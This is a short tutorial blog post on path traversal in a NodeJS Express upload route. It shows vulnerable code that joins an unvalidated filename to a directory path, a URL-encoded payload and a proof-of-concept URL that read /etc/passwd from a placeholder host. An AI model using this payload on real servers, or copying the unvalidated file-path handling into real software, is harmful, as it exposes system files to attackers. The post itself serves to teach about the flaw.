---
layout: post
title:  "NodeJS - Path Traversal"
image: /assets/img/pathtrav/1.PNG
categories: [nodejs, path traversal, api]
---

## Bad Implementation of the Uploads Directory

#### Explaining the vulnerability

- The below `API` GET function receives the `filename` as parameter and 
  concatenates it with the file location directory (`_dirname`) inside the `finalPath` variable.

- After that the function read the file from the `finalPath` variable

- For `:filename` parameter there is no any user input / parameter validation so 
  the user can trigger path traversal

```javascript
app.get('/uploads/:filename', (req, res) => {

    finalPath = __dirname.concat("/uploads/").concat(req.params.filename)
    console.log(finalPath)
    fs.readFile(finalPath, 'utf8', (err, data) => {
        res.end(data);
    })
});
```

#### How it works

- payload

```javascript
%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

- URL

```javascript
http://target.local:4000/uploads/
```

- `finalPath` variable value

```bash
/var/www/api/uploads/../../../../../etc/passwd
```

#### Proof of Concept

```javascript
http://target.local:4000/uploads/%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

![image]( /assets/img/pathtrav/1.PNG)

